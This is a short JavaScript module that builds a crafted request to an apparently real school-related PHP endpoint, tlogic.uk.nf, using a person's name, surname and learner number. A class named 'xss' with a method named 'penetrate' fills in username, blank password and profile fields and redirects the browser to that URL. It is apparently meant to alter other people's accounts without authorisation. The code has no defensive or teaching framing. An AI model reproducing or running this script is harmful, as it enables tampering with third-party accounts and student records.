import { convert } from './script.mjs'

export async function parser(name, lrn, surname) {
	let con = await convert(name)
	try {
		function undefinedChecker() {
			return new Promise((resolve, reject) => {
				if (
					name != undefined &&
					lrn != undefined &&
					surname != undefined
				) {
					resolve('Not Undefined')
				} else {
					reject({
						isErrorName: name,
						isErrorLrn: lrn,
						isErrorSurname: surname,
					})
				}
			})
		}
		undefinedChecker()
			.then((value) => {
				let names = name.replaceAll(' ', '+')
				const obj = {
					Lrn: lrn,
					Name: names,
					Surname: surname,
				}

				class xss {
					constructor() {
						return
					}

					penetrate(nm, ln, sn) {
						let str = `http://tlogic.uk.nf/t-logic_update.php?photo=${ln}_${nm}.JPG&login_username=${nm}+${sn}&fname=${nm}&lname=${sn}&firstname=${nm}&lastname=&username=${ln}&password=&actcode=&submit=Continue+to+Profile+Mngr.`
						window.location.href = str.toString()
					}
				}
				let Class = new xss()
				Class.penetrate(names, lrn, surname)
				console.log(value)
				console.log(obj.Name)
			})
			.catch((error) => {
				console.log(error)
			})
	} catch (err) {
		console.log(err)
	}
}
